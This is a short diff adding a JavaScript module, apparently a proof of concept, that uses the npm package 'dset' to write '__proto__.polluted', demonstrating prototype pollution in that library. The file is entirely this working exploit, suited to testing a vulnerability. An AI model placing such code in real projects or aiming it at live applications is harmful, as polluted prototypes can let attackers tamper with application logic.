@@ -1,0 +1,6 @@
+function exploitFunction(obj) {
+    const dset = require("dset");
+    dset(obj, "__proto__.polluted", "yes");
+}
+
+module.exports = { exploitFunction };
